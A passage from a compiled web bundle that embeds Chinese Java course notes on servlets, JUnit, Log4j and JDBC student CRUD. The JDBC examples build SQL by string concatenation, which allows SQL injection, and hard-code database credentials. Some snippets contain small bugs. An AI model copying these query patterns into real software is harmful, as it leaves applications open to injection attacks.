httpResponse);\n          } else if ("delStudent".equals(method)) {\n              //删除学生\n              delStudent(httpRequest, httpResponse);\n          } else if ("updateStudent".equals(method)) {\n              //修改学生\n              updateStudent(httpRequest, httpResponse);\n          } else if ("findStudent".equals(method)) {\n              //查询学生\n              findStudent(httpRequest, httpResponse);\n          }\n      }\n\n      //查询学生\n      private void findStudent(HttpRequest httpRequest, HttpResponse httpResponse) {\n      }\n\n      //修改学生\n      private void updateStudent(HttpRequest httpRequest, HttpResponse httpResponse) {\n      }\n\n      //删除学生\n      private void delStudent(HttpRequest httpRequest, HttpResponse httpResponse) {\n      }\n\n      //添加学生\n      private void addStudent(HttpRequest httpRequest, HttpResponse httpResponse) {   \n      }\n  }\n  ```\n\n### 1.5查询学生【应用】\n\n+ 实现步骤\n\n  1. 创建StudentService对象\n  2. 调用StudentService中的findAllStudent方法，完成学生数据的查询操作\n  3. 遍历数组，拼接成一个字符串\n  4. 将拼接的结果响应给浏览器\n\n+ 代码实现\n\n  ```java\n  @WebServlet(urlPatterns = "/servlet/studentservlet")\n  public class StudentServlet implements HttpServlet {\n      //1.创建StudentService对象\n      private StudentService studentService = new StudentService();\n\n      @Override\n      public void service(HttpRequest httpRequest, HttpResponse httpResponse) {\n          //获取method请求参数\n\n          String method = httpRequest.getParamter("method");\n          System.out.println(method);\n          //判断\n          if ("addStudent".equals(method)) {\n              //添加学生\n              addStudent(httpRequest, httpResponse);\n          } else if ("delStudent".equals(method)) {\n              //删除学生\n              delStudent(httpRequest, httpResponse);\n          } else if ("updateStudent".equals(method)) {\n              //修改学生\n              updateStudent(httpRequest, httpResponse);\n          } else if ("findStudent".equals(method)) {\n              //查询学生\n              findStudent(httpRequest, httpResponse);\n          }\n      }\n\n      //查询学生\n      private void findStudent(HttpRequest httpRequest, HttpResponse httpResponse) {\n          //2.调用StudentService中的findAllStudent方法，完成学生数据的查询操作\n          Student[] allStudent = studentService.findAllStudent();\n          //3.遍历数组，拼接成一个字符串\n          StringBuilder sb = new StringBuilder();\n          for (Student student : allStudent) {\n              sb.append(student.getId()).append(", ").append(student.getName()).\n                      append(", ").append(student.getAge()).append(", ").\n                      append(student.getBirthday()).append("<br>");\n          }\n          String result = sb.toString();\n          //4.将拼接的结果响应给浏览器\n          //告诉浏览器响应的类型\n          httpResponse.setContentTpye("text/html;charset=UTF-8");\n          if (result == null || "".equals(result)) {\n              httpResponse.write("暂无学生数据。。。。");\n          } else {\n              httpResponse.write(result);\n          }\n      }\n      //修改学生\n      private void updateStudent(HttpRequest httpRequest, HttpResponse httpResponse) {\n      }\n\n      //删除学生\n      private void delStudent(HttpRequest httpRequest, HttpResponse httpResponse) {\n      }\n\n      //添加学生\n      private void addStudent(HttpRequest httpRequest, HttpResponse httpResponse) {   \n      }\n  }  \n  ```\n\n### 1.6添加学生【应用】\n\n+ 实现步骤\n\n  1. 获取id的请求参数\n  2. 判断id是否重复\n  3. 如果重复。给浏览器响应，id已经重复\n  4. 如果id不重复。添加学生。并给浏览器响应添加学生成功\n\n+ 代码实现\n\n  ```java\n  @WebServlet(urlPatterns = "/servlet/studentservlet")\n  public class StudentServlet implements HttpServlet {\n      //1.创建StudentService对象\n      private StudentService studentService = new StudentService();\n\n      @Override\n      public void service(HttpRequest httpRequest, HttpResponse httpResponse) {\n          //获取method请求参数\n\n          String method = httpRequest.getParamter("method");\n          System.out.println(method);\n          //判断\n          if ("addStudent".equals(method)) {\n              //添加学生\n              addStudent(httpRequest, httpResponse);\n          } else if ("delStudent".equals(method)) {\n              //删除学生\n              delStudent(httpRequest, httpResponse);\n          } else if ("updateStudent".equals(method)) {\n              //修改学生\n              updateStudent(httpRequest, httpResponse);\n          } else if ("findStudent".equals(method)) {\n              //查询学生\n              findStudent(httpRequest, httpResponse);\n          }\n      }\n\n      //查询学生\n      private void findStudent(HttpRequest httpRequest, HttpResponse httpResponse) {\n         //...\n      }\n      //修改学生\n      private void updateStudent(HttpRequest httpRequest, HttpResponse httpResponse) {\n      }\n      //删除学生\n      private void delStudent(HttpRequest httpRequest, HttpResponse httpResponse) {\n      }\n      //添加学生\n      private void addStudent(HttpRequest httpRequest, HttpResponse httpResponse) {\n          //1.获取id的请求参数\n          String id = httpRequest.getParamter("id");\n          //2.判断id是否重复\n          boolean exists = studentService.isExists(id);\n          httpResponse.setContentTpye("text/html;charset=UTF-8");\n          if (exists) {\n              //3.如果重复。给浏览器响应，id已经重复\n              httpResponse.write("id已经存在，请重新输入。。。");\n          } else {\n              //4.如果id不重复。添加学生。并给浏览器响应添加学生成功\n              String name = httpRequest.getParamter("name");\n              String age = httpRequest.getParamter("age");\n              String birthday = httpRequest.getParamter("birthday");\n              //对数据进行处理\n              try {\n                  int ageInt = Integer.parseInt(age);\n                  SimpleDateFormat sdf = new SimpleDateFormat("yyyy-MM-dd");\n                  Date date = sdf.parse(birthday);\n                  //创建一个学生对象\n                  Student s = new Student();\n                  s.setId(id);\n                  s.setName(name);\n                  s.setAge(age);\n                  s.setBirthday(birthday);\n                  //调用studentservice里面的方法\n                  studentService.addStudent(s);\n                  //给浏览器响应\n                  httpResponse.write("学生数据添加成功....");\n              } catch (ParseException e) {\n                  httpResponse.write("日期格式不正确，正确的格式为:yyyy-MM-dd");\n                  e.printStackTrace();\n              } catch (NumberFormatException e) {\n                  httpResponse.write("年龄只能为整数");\n                  e.printStackTrace();\n              }\n              //birthday  yyyy-MM-dd\n          }\n      }\n  }\n  ```\n\n## 2.单元测试\n\n### 2.1概述【理解】\n\nJUnit是一个 Java 编程语言的单元测试工具。JUnit 是一个非常重要的测试工具\n\n### 2.2特点【理解】\n\n+ JUnit是一个开放源代码的测试工具。\n+ 提供注解来识别测试方法。\n+ JUnit测试可以让你编写代码更快，并能提高质量。\n+ JUnit优雅简洁。没那么复杂，花费时间较少。\n+ JUnit在一个条中显示进度。如果运行良好则是绿色；如果运行失败，则变成红色。\n\n### 2.3使用步骤【应用】\n\n+ 使用步骤\n  1. 将junit的jar包导入到工程中 junit-4.9.jar\n  2. 编写测试方法该测试方法必须是公共的无参数无返回值的非静态方法\n  3. 在测试方法上使用@Test注解标注该方法是一个测试方法\n  4. 选中测试方法右键通过junit运行该方法\n\n+ 代码示例\n\n  ```java\n  public class JunitDemo1 {\n      @Test\n      public void add() {\n          System.out.println(2 / 0);\n          int a = 10;\n          int b = 20;\n          int sum = a + b;\n          System.out.println(sum);\n      }\n  }\n  ```\n\n### 2.4相关注解【应用】\n\n+ 注解说明\n\n  | 注解      | 含义        |\n  | ------- | --------- |\n  | @Test   | 表示测试该方法   |\n  | @Before | 在测试的方法前运行 |\n  | @After  | 在测试的方法后运行 |\n\n+ 代码示例\n\n  ```java\n  public class JunitDemo2 {\n      @Before\n      public void before() {\n        \t// 在执行测试代码之前执行，一般用于初始化操作\n          System.out.println("before");\n      }\n      @Test\n      public void test() {\n        \t// 要执行的测试代码\n          System.out.println("test");\n      }\n      @After\n      public void after() {\n        \t// 在执行测试代码之后执行，一般用于释放资源\n          System.out.println("after");\n      }\n  }\n  ```\n\n## 3.日志\n\n### 3.1概述【理解】\n\n+ 概述\n\n  程序中的日志可以用来记录程序在运行的时候点点滴滴。并可以进行永久存储。\n\n+ 日志与输出语句的区别\n\n  |      | 输出语句          | 日志技术                 |\n  | ---- | ------------- | -------------------- |\n  | 取消日志 | 需要修改代码，灵活性比较差 | 不需要修改代码，灵活性比较好       |\n  | 输出位置 | 只能是控制台        | 可以将日志信息写入到文件或者数据库中   |\n  | 多线程  | 和业务代码处于一个线程中  | 多线程方式记录日志，不影响业务代码的性能 |\n\n### 3.2日志体系结构和Log4J【理解】\n\n+ 体系结构\n\n  ![06_日志体系结构](./img/java/basics/day27-基础加强03.img/06_日志体系结构.png)\n\n+ Log4J\n\n  Log4j是Apache的一个开源项目。\n\n  通过使用Log4j，我们可以控制日志信息输送的目的地是控制台、文件等位置。\n\n  我们也可以控制每一条日志的输出格式。\n\n  通过定义每一条日志信息的级别，我们能够更加细致地控制日志的生成过程。\n\n  最令人感兴趣的就是，这些可以通过一个配置文件来灵活地进行配置，而不需要修改应用的代码。\n\n+ Apache基金会\n\n  Apache软件基金会（也就是Apache Software Foundation，简称为ASF），为支持开源软件项目而办的一个非盈利性组织。\n\n### 3.3入门案例【应用】\n\n+ 使用步骤\n\n  1. 导入log4j的相关jar包\n  2. 编写log4j配置文件\n  3. 在代码中获取日志的对象\n  4. 按照级别设置记录日志信息\n\n+ 代码示例\n\n  ```java\n  // log4j的配置文件,名字为log4j.properties, 放在src根目录下\n  log4j.rootLogger=debug,my,fileAppender\n\n  ### direct log messages to my ###\n  log4j.appender.my=org.apache.log4j.ConsoleAppender\n  log4j.appender.my.ImmediateFlush = true\n  log4j.appender.my.Target=System.out\n  log4j.appender.my.layout=org.apache.log4j.PatternLayout\n  log4j.appender.my.layout.ConversionPattern=%d %t %5p %c{1}:%L - %m%n\n\n  # fileAppender��ʾ\n  log4j.appender.fileAppender=org.apache.log4j.FileAppender\n  log4j.appender.fileAppender.ImmediateFlush = true\n  log4j.appender.fileAppender.Append=true\n  log4j.appender.fileAppender.File=D:/log4j-log.log\n  log4j.appender.fileAppender.layout=org.apache.log4j.PatternLayout\n  log4j.appender.fileAppender.layout.ConversionPattern=%d %5p %c{1}:%L - %m%n\n\n  // 测试类\n  public class Log4JTest01 {\n\n      //使用log4j的api来获取日志的对象\n      //弊端：如果以后我们更换日志的实现类，那么下面的代码就需要跟着改\n      //不推荐使用\n      //private static final Logger LOGGER = Logger.getLogger(Log4JTest01.class);\n\n      //使用slf4j里面的api来获取日志的对象\n      //好处：如果以后我们更换日志的实现类，那么下面的代码不需要跟着修改\n      //推荐使用\n      private static  final Logger LOGGER = LoggerFactory.getLogger(Log4JTest01.class);\n\n      public static void main(String[] args) {\n          //1.导入jar包\n          //2.编写配置文件\n          //3.在代码中获取日志的对象\n          //4.按照日志级别设置日志信息\n          LOGGER.debug("debug级别的日志");\n          LOGGER.info("info级别的日志");\n          LOGGER.warn("warn级别的日志");\n          LOGGER.error("error级别的日志");\n      }\n  }\n  ```\n\n### 3.4配置文件详解【理解】\n\n+ 三个核心\n\n  + Loggers(记录器)        日志的级别\n\n    Loggers组件在此系统中常见的五个级别：DEBUG、INFO、WARN、ERROR 和 FATAL。\n\n    DEBUG < INFO < WARN < ERROR < FATAL。\n\n    Log4j有一个规则：只输出级别不低于设定级别的日志信息。\n\n  + Appenders(输出源)   日志要输出的地方\n\n    把日志输出到不同的地方，如控制台（Console）、文件（Files）等。\n\n    + org.apache.log4j.ConsoleAppender（控制台）\n    + org.apache.log4j.FileAppender（文件）\n\n  + Layouts(布局)             日志输出的格式\n\n    可以根据自己的喜好规定日志输出的格式\n\n    常用的布局管理器：\n\n    ​\t\torg.apache.log4j.PatternLayout（可以灵活地指定布局模式）\n\n    ​          \torg.apache.log4j.SimpleLayout（包含日志信息的级别和信息字符串）\n\n     \t\torg.apache.log4j.TTCCLayout（包含日志产生的时间、线程、类别等信息）\n\n+ 配置根Logger\n\n  + 格式\n\n    log4j.rootLogger=日志级别，appenderName1，appenderName2，…\n\n  + 日志级别\n\n    OFF、FATAL、ERROR、WARN、INFO、DEBUG、ALL或者自定义的级别。\n\n  + appenderName1\n\n    就是指定日志信息要输出到哪里。可以同时指定多个输出目的地，用逗号隔开。\n\n    例如：log4j.rootLogger＝INFO，ca，fa\n\n+ ConsoleAppender常用的选项\n\n  + ImmediateFlush=true\n\n    表示所有消息都会被立即输出，设为false则不输出，默认值是true。\n\n  + Target=System.err\n\n    默认值是System.out。\n\n+ FileAppender常用的选项\n\n  + ImmediateFlush=true\n\n    表示所有消息都会被立即输出。设为false则不输出，默认值是true\n\n  + Append=false\n\n    true表示将消息添加到指定文件中，原来的消息不覆盖。\n\n    false则将消息覆盖指定的文件内容，默认值是true。\n\n  + File=D:/logs/logging.log4j\n\n    指定消息输出到logging.log4j文件中\n\n+ PatternLayout常用的选项\n\n  + ConversionPattern=%m%n\n\n    设定以怎样的格式显示消息\n\n    ![07_PatternLayout常用的选项](./img/java/basics/day27-基础加强03.img/07_PatternLayout常用的选项.png)\n\n### 3.5在项目中的应用【应用】\n\n+ 步骤\n\n  1. 导入相关的依赖\n  2. 将资料中的properties配置文件复制到src目录下\n  3. 在代码中获取日志的对象\n  4. 按照级别设置记录日志信息\n\n+ 代码实现\n\n  ```java\n  @WebServlet(urlPatterns = "/servlet/loginservlet")\n  public class LoginServlet implements HttpServlet{\n\n      //获取日志的对象\n      private static final Logger LOGGER = LoggerFactory.getLogger(LoginServlet.class);\n\n      @Override\n      public void service(HttpRequest httpRequest, HttpResponse httpResponse) {\n         //处理\n          System.out.println("LoginServlet处理了登录请求");\n\n          LOGGER.info("现在已经处理了登录请求，准备给浏览器响应");\n\n         //响应\n          httpResponse.setContentTpye("text/html;charset=UTF-8");\n          httpResponse.write("登录成功");\n      }\n  }\n  ```\n\n',tr={data:function(){return{MainComponent1:Zn,MainComponent2:nr,MainComponent3:rr}}},er=tr,ar=Object(u["a"])(er,Xn,Yn,!1,null,"3590c4ee",null),ir=ar.exports,sr=t("1b62"),or={mixins:[sr["a"]],components:{m99:d,m1:T,m2:O,m3:H,m4:$,m5:Z,m6:cn,m7:hn,m8:kn,m9:In,m10:Un,m11:Kn,m12:ir},data:function(){return{tab:"m1",tab_level:2,tabs:[{label:"基础笔记",value:"m99"},{label:"Java基础语法",value:"m1"},{label:"面向对象基础",value:"m2"},{label:"API基础",value:"m3"},{label:"集合基础",value:"m4"},{label:"Git",value:"m5"},{label:"面向对象进阶",value:"m6"},{label:"常用API&异常",value:"m7"},{label:"集合",value:"m8"},{label:"IO流",value:"m9"},{label:"多线程",value:"m10"},{label:"网络编程",value:"m11"},{label:"基础加强",value:"m12"}]}}},lr=or,cr=Object(u["a"])(lr,i,s,!1,null,"126c4bbd",null),pr=cr.exports,ur=function(){var n=this,r=n.$createElement,t=n._self._c||r;return t("div",[t(""+n.tab,{tag:"component"})],1)},mr=[],dr=function(){var n=this,r=n.$createElement,t=n._self._c||r;return t("div",{},[t("q-markdown",{attrs:{src:n.MainComponent}})],1)},gr=[],br='\x3c!--\r\n * @Date           : 2021-04-12 16:03:11\r\n * @FilePath       : /jinnian-space/src/pages/java/module/jdbc/md/JDBC-01-授课笔记.md\r\n * @Description    : \r\n--\x3e\r\n# JDBC-01-授课笔记\r\n\r\n### 一、JDBC快速入门\r\n\r\n#### 1.jdbc的概念\r\n \r\n\r\n- JDBC（Java DataBase Connectivity,java数据库连接）是一种用于执行SQL语句的Java API，可以为多种关系型数据库提供统一访问，它是由一组用Java语言编写的类和接口组成的。\r\n\r\n#### 2.jdbc的本质\r\n\r\n- 其实就是java官方提供的一套规范(接口)。用于帮助开发人员快速实现不同关系型数据库的连接！\r\n\r\n#### 3.jdbc的快速入门程序\r\n\r\n1. 导入jar包\r\n\r\n2. 注册驱动\r\n\r\n   ```java\r\n   Class.forName("com.mysql.jdbc.Driver");\r\n   ```\r\n\r\n3. 获取连接\r\n\r\n   ```java\r\n   Connection con = DriverManager.getConnection("jdbc:mysql://localhost:3306/db2", "root", "root");\r\n   ```\r\n\r\n4. 获取执行者对象\r\n\r\n   ```java\r\n   Statement stat = con.createStatement();\r\n   ```\r\n\r\n5. 执行sql语句，并接收返回结果\r\n\r\n   ```java\r\n   String sql = "SELECT * FROM user";\r\n   ResultSet rs = stat.executeQuery(sql);\r\n   ```\r\n\r\n6. 处理结果\r\n\r\n   ```java\r\n   while(rs.next()) {\r\n       System.out.println(rs.getInt("id") + "\\t" + rs.getString("name"));\r\n   }\r\n   ```\r\n\r\n7. 释放资源\r\n\r\n   ```java\r\n   con.close();\r\n   stat.close();\r\n   rs.close();\r\n   ```\r\n\r\n### 二、JDBC各个功能类详解\r\n\r\n#### 1.DriverManager\r\n\r\n- DriverManager：驱动管理对象\r\n\r\n  - 注册驱动(告诉程序该使用哪一个数据库驱动)\r\n\r\n    - static void registerDriver(Driver driver)：注册与给定的驱动程序 DriverManager \r\n    - 写代码使用：Class.forName("com.mysql.jdbc.Driver");\r\n    - 通过查看源码发现：在com.mysql.jdbc.Driver类中存在静态代码块\r\n\r\n    ```java\r\n    static {\r\n    \ttry {\r\n    \t\tjava.sql.DriverManager.registerDriver(new Driver());\r\n    \t} catch (SQLException E) {\r\n    \t\tthrow new RuntimeException("Can\'t register driver!");\r\n    \t}\r\n    }\r\n    ```\r\n\r\n    - 注意：mysql5之后的驱动jar包可以省略注册驱动的步骤。在jar包中，存在一个java.sql.Driver配置文件，文件中指定了com.mysql.jdbc.Driver\r\n\r\n  - 获取数据库连接(获取到数据库的连接并返回连接对象)\r\n\r\n    - static Connection getConnection(String url, String user, String password);\r\n      - 返回值：Connection数据库连接对象\r\n      - 参数\r\n        - url：指定连接的路径。语法：jdbc:mysql://ip地址(域名):端口号/数据库名称\r\n        - user：用户名\r\n        - password：密码\r\n\r\n#### 2.Connection\r\n\r\n- Connection：数据库连接对象\r\n  - 获取执行者对象\r\n    - 获取普通执行者对象：Statement createStatement();\r\n    - 获取预编译执行者对象：PreparedStatement prepareStatement(String sql);\r\n  - 管理事务\r\n    - 开启事务：setAutoCommit(boolean autoCommit);     参数为false，则开启事务。\r\n    - 提交事务：commit();\r\n    - 回滚事务：rollback();\r\n  - 释放资源\r\n    - 立即将数据库连接对象释放：void close();\r\n\r\n#### 3.Statement\r\n\r\n- Statement：执行sql语句的对象\r\n  - 执行DML语句：int executeUpdate(String sql);\r\n    - 返回值int：返回影响的行数。\r\n    - 参数sql：可以执行insert、update、delete语句。\r\n  - 执行DQL语句：ResultSet executeQuery(String sql);\r\n    - 返回值ResultSet：封装查询的结果。\r\n    - 参数sql：可以执行select语句。\r\n  - 释放资源\r\n    - 立即将执行者对象释放：void close();\r\n\r\n#### 4.ResultSet\r\n\r\n- ResultSet：结果集对象\r\n  - 判断结果集中是否还有数据：boolean next();\r\n    - 有数据返回true，并将索引向下移动一行\r\n    - 没有数据返回false\r\n  - 获取结果集中的数据：XXX getXxx("列名");\r\n    - XXX代表数据类型(要获取某列数据，这一列的数据类型)\r\n    - 例如：String getString("name");          int getInt("age");\r\n  - 释放资源\r\n    - 立即将结果集对象释放：void close();\r\n\r\n### 三、JDBC案例student学生表的CRUD\r\n\r\n#### 1.数据准备\r\n\r\n- 数据库和数据表\r\n\r\n```mysql\r\n-- 创建db14数据库\r\nCREATE DATABASE db14;\r\n\r\n-- 使用db14数据库\r\nUSE db14;\r\n\r\n-- 创建student表\r\nCREATE TABLE student(\r\n\tsid INT PRIMARY KEY AUTO_INCREMENT,\t-- 学生id\r\n\tNAME VARCHAR(20),\t\t\t\t\t-- 学生姓名\r\n\tage INT,\t\t\t\t\t\t\t-- 学生年龄\r\n\tbirthday DATE\t\t\t\t\t\t-- 学生生日\r\n);\r\n\r\n-- 添加数据\r\nINSERT INTO student VALUES (NULL,\'张三\',23,\'1999-09-23\'),(NULL,\'李四\',24,\'1998-08-10\'),(NULL,\'王五\',25,\'1996-06-06\'),(NULL,\'赵六\',26,\'1994-10-20\');\r\n```\r\n\r\n- 实体类\r\n  - Student类，成员变量对应表中的列\r\n  - 注意：所有的基本数据类型需要使用包装类，以防null值无法赋值\r\n\r\n```java\r\npackage com.itheima02.domain;\r\n\r\nimport java.util.Date;\r\n\r\npublic class Student {\r\n    private Integer sid;\r\n    private String name;\r\n    private Integer age;\r\n    private Date birthday;\r\n\r\n    public Student() {\r\n    }\r\n\r\n    public Student(Integer sid, String name, Integer age, Date birthday) {\r\n        this.sid = sid;\r\n        this.name = name;\r\n        this.age = age;\r\n        this.birthday = birthday;\r\n    }\r\n\r\n    public Integer getSid() {\r\n        return sid;\r\n    }\r\n\r\n    public void setSid(Integer sid) {\r\n        this.sid = sid;\r\n    }\r\n\r\n    public String getName() {\r\n        return name;\r\n    }\r\n\r\n    public void setName(String name) {\r\n        this.name = name;\r\n    }\r\n\r\n    public Integer getAge() {\r\n        return age;\r\n    }\r\n\r\n    public void setAge(Integer age) {\r\n        this.age = age;\r\n    }\r\n\r\n    public Date getBirthday() {\r\n        return birthday;\r\n    }\r\n\r\n    public void setBirthday(Date birthday) {\r\n        this.birthday = birthday;\r\n    }\r\n\r\n    @Override\r\n    public String toString() {\r\n        return "Student{" +\r\n                "sid=" + sid +\r\n                ", name=\'" + name + \'\\\'\' +\r\n                ", age=" + age +\r\n                ", birthday=" + birthday +\r\n                \'}\';\r\n    }\r\n}\r\n```\r\n\r\n#### 2.需求一：查询全部\r\n\r\n- 持久层\r\n\r\n```java\r\n/*\r\n     查询所有学生信息\r\n*/\r\n@Override\r\npublic ArrayList<Student> findAll() {\r\n    ArrayList<Student> list = new ArrayList<>();\r\n    Connection con = null;\r\n    Statement stat = null;\r\n    ResultSet rs = null;\r\n    try{\r\n        //1.注册驱动\r\n        Class.forName("com.mysql.jdbc.Driver");\r\n\r\n        //2.获取数据库连接\r\n        con = DriverManager.getConnection("jdbc:mysql://192.168.59.129:3306/db14", "root", "itheima");\r\n\r\n        //3.获取执行者对象\r\n        stat = con.createStatement();\r\n\r\n        //4.执行sql语句，并且接收返回的结果集\r\n        String sql = "SELECT * FROM student";\r\n        rs = stat.executeQuery(sql);\r\n\r\n        //5.处理结果集\r\n        while(rs.next()) {\r\n            Integer sid = rs.getInt("sid");\r\n            String name = rs.getString("name");\r\n            Integer age = rs.getInt("age");\r\n            Date birthday = rs.getDate("birthday");\r\n\r\n            //封装Student对象\r\n            Student stu = new Student(sid,name,age,birthday);\r\n\r\n            //将student对象保存到集合中\r\n            list.add(stu);\r\n        }\r\n\r\n    } catch(Exception e) {\r\n        e.printStackTrace();\r\n    } finally {\r\n        //6.释放资源\r\n        if(con != null) {\r\n            try {\r\n                con.close();\r\n            } catch (SQLException e) {\r\n                e.printStackTrace();\r\n            }\r\n        }\r\n\r\n        if(stat != null) {\r\n            try {\r\n                stat.close();\r\n            } catch (SQLException e) {\r\n                e.printStackTrace();\r\n            }\r\n        }\r\n\r\n        if(rs != null) {\r\n            try {\r\n                rs.close();\r\n            } catch (SQLException e) {\r\n                e.printStackTrace();\r\n            }\r\n        }\r\n    }\r\n    //将集合对象返回\r\n    return list;\r\n}\r\n```\r\n\r\n- 业务层\r\n\r\n```java\r\n/*\r\n    查询所有学生信息\r\n*/\r\n@Override\r\npublic ArrayList<Student> findAll() {\r\n    return dao.findAll();\r\n}\r\n```\r\n\r\n- 控制层\r\n\r\n```java\r\n/*\r\n    查询所有学生信息\r\n*/\r\n@Test\r\npublic void findAll() {\r\n    ArrayList<Student> list = service.findAll();\r\n    for(Student stu : list) {\r\n        System.out.println(stu);\r\n    }\r\n}\r\n```\r\n\r\n#### 3.需求二：条件查询\r\n\r\n- 持久层\r\n\r\n```java\r\n/*\r\n    条件查询，根据id查询学生信息\r\n*/\r\n@Override\r\npublic Student findById(Integer id) {\r\n    Student stu = new Student();\r\n    Connection con = null;\r\n    Statement stat = null;\r\n    ResultSet rs = null;\r\n    try{\r\n        //1.注册驱动\r\n        Class.forName("com.mysql.jdbc.Driver");\r\n\r\n        //2.获取数据库连接\r\n        con = DriverManager.getConnection("jdbc:mysql://192.168.59.129:3306/db14", "root", "itheima");\r\n\r\n        //3.获取执行者对象\r\n        stat = con.createStatement();\r\n\r\n        //4.执行sql语句，并且接收返回的结果集\r\n        String sql = "SELECT * FROM student WHERE sid=\'"+id+"\'";\r\n        rs = stat.executeQuery(sql);\r\n\r\n        //5.处理结果集\r\n        while(rs.next()) {\r\n            Integer sid = rs.getInt("sid");\r\n            String name = rs.getString("name");\r\n            Integer age = rs.getInt("age");\r\n            Date birthday = rs.getDate("birthday");\r\n\r\n            //封装Student对象\r\n            stu.setSid(sid);\r\n            stu.setName(name);\r\n            stu.setAge(age);\r\n            stu.setBirthday(birthday);\r\n        }\r\n\r\n    } catch(Exception e) {\r\n        e.printStackTrace();\r\n    } finally {\r\n        //6.释放资源\r\n        if(con != null) {\r\n            try {\r\n                con.close();\r\n            } catch (SQLException e) {\r\n                e.printStackTrace();\r\n            }\r\n        }\r\n\r\n        if(stat != null) {\r\n            try {\r\n                stat.close();\r\n            } catch (SQLException e) {\r\n                e.printStackTrace();\r\n            }\r\n        }\r\n\r\n        if(rs != null) {\r\n            try {\r\n                rs.close();\r\n            } catch (SQLException e) {\r\n                e.printStackTrace();\r\n            }\r\n        }\r\n    }\r\n    //将对象返回\r\n    return stu;\r\n}\r\n```\r\n\r\n- 业务层\r\n\r\n```java\r\n/*\r\n    条件查询，根据id查询学生信息\r\n*/\r\n@Override\r\npublic Student findById(Integer id) {\r\n    return dao.findById(id);\r\n}\r\n```\r\n\r\n- 控制层\r\n\r\n```java\r\n/*\r\n    条件查询，根据id查询学生信息\r\n*/\r\n@Test\r\npublic void findById() {\r\n    Student stu = service.findById(3);\r\n    System.out.println(stu);\r\n}\r\n```\r\n\r\n#### 4.需求三：新增数据\r\n\r\n- 持久层\r\n\r\n```java\r\n/*\r\n      添加学生信息\r\n*/\r\n@Override\r\npublic int insert(Student stu) {\r\n    Connection con = null;\r\n    Statement stat = null;\r\n    int result = 0;\r\n    try{\r\n        //1.注册驱动\r\n        Class.forName("com.mysql.jdbc.Driver");\r\n\r\n        //2.获取数据库连接\r\n        con = DriverManager.getConnection("jdbc:mysql://192.168.59.129:3306/db14", "root", "itheima");\r\n\r\n        //3.获取执行者对象\r\n        stat = con.createStatement();\r\n\r\n        //4.执行sql语句，并且接收返回的结果集\r\n        Date d = stu.getBirthday();\r\n        SimpleDateFormat sdf = new SimpleDateFormat("yyyy-MM-dd");\r\n        String birthday = sdf.format(d);\r\n        String sql = "INSERT INTO student VALUES (\'"+stu.getSid()+"\',\'"+stu.getName()+"\',\'"+stu.getAge()+"\',\'"+birthday+"\')";\r\n        result = stat.executeUpdate(sql);\r\n\r\n    } catch(Exception e) {\r\n        e.printStackTrace();\r\n    } finally {\r\n        //6.释放资源\r\n        if(con != null) {\r\n            try {\r\n                con.close();\r\n            } catch (SQLException e) {\r\n                e.printStackTrace();\r\n            }\r\n        }\r\n\r\n        if(stat != null) {\r\n            try {\r\n                stat.close();\r\n            } catch (SQLException e) {\r\n                e.printStackTrace();\r\n            }\r\n        }\r\n    }\r\n    //将结果返回\r\n    return result;\r\n}\r\n```\r\n\r\n- 业务层\r\n\r\n```java\r\n/*\r\n    新增学生信息\r\n*/\r\n@Override\r\npublic int insert(Student stu) {\r\n    return dao.insert(stu);\r\n}\r\n```\r\n\r\n- 控制层\r\n\r\n```java\r\n/*\r\n  \t新增学生信息\r\n*/\r\n@Test\r\npublic void insert() {\r\n    Student stu = new Student(5,"周七",27,new Date());\r\n    int result = service.insert(stu);\r\n    if(result != 0) {\r\n        System.out.println("新增成功");\r\n    }else {\r\n        System.out.println("新增失败");\r\n    }\r\n}\r\n```\r\n\r\n#### 5.需求四：修改数据\r\n\r\n- 持久层\r\n\r\n```java\r\n/*\r\n    修改学生信息\r\n*/\r\n@Override\r\npublic int update(Student stu) {\r\n    Connection con = null;\r\n    Statement stat = null;\r\n    int result = 0;\r\n    try{\r\n        //1.注册驱动\r\n        Class.forName("com.mysql.jdbc.Driver");\r\n\r\n        //2.获取数据库连接\r\n        con = DriverManager.getConnection("jdbc:mysql://192.168.59.129:3306/db14", "root", "itheima");\r\n\r\n        //3.获取执行者对象\r\n        stat = con.createStatement();\r\n\r\n        //4.执行sql语句，并且接收返回的结果集\r\n        Date d = stu.getBirthday();\r\n        SimpleDateFormat sdf = new SimpleDateFormat("yyyy-MM-dd");\r\n        String birthday = sdf.format(d);\r\n        String sql = "UPDATE student SET sid=\'"+stu.getSid()+"\',name=\'"+stu.getName()+"\',age=\'"+stu.getAge()+"\',birthday=\'"+birthday+"\' WHERE sid=\'"+stu.getSid()+"\'";\r\n        result = stat.executeUpdate(sql);\r\n\r\n    } catch(Exception e) {\r\n        e.printStackTrace();\r\n    } finally {\r\n        //6.释放资源\r\n        if(con != null) {\r\n            try {\r\n                con.close();\r\n            } catch (SQLException e) {\r\n                e.printStackTrace();\r\n            }\r\n        }\r\n\r\n        if(stat != null) {\r\n            try {\r\n                stat.close();\r\n            } catch (SQLException e) {\r\n                e.printStackTrace();\r\n            }\r\n        }\r\n    }\r\n    //将结果返回\r\n    return result;\r\n}\r\n```\r\n\r\n- 业务层\r\n\r\n```java\r\n/*\r\n    修改学生信息\r\n*/\r\n@Override\r\npublic int update(Student stu) {\r\n    return dao.update(stu);\r\n}\r\n```\r\n\r\n- 控制层\r\n\r\n```java\r\n/*\r\n    修改学生信息\r\n*/\r\n@Test\r\npublic void update() {\r\n    Student stu = service.findById(5);\r\n    stu.setName("周七七");\r\n\r\n    int result = service.update(stu);\r\n    if(result != 0) {\r\n        System.out.println("修改成功");\r\n    }else {\r\n        System.out.println("修改失败");\r\n    }\r\n}\r\n```\r\n\r\n#### 6.需求五：删除数据\r\n\r\n- 持久层\r\n\r\n```java\r\n/*\r\n    删除学生信息\r\n*/\r\n@Override\r\npublic int delete(Integer id) {\r\n    Connection con = null;\r\n    Statement stat = null;\r\n    int result = 0;\r\n    try{\r\n        //1.注册驱动\r\n        Class.forName("com.mysql.jdbc.Driver");\r\n\r\n        //2.获取数据库连接\r\n        con = DriverManager.getConnection("jdbc:mysql://192.168.59.129:3306/db14", "root", "itheima");\r\n\r\n        //3.获取执行者对象\r\n        stat = con.createStatement();\r\n\r\n        //4.执行sql语句，并且接收返回的结果集\r\n        String sql = "DELETE FROM student WHERE sid=\'"+id+"\'";\r\n        result = stat.executeUpdate(sql);\r\n\r\n    } catch(Exception e) {\r\n        e.printStackTrace();\r\n    } finally {\r\n        //6.释放资源\r\n        if(con != null) {\r\n            try {\r\n                con.close();\r\n            } catch (SQLException e) {\r\n                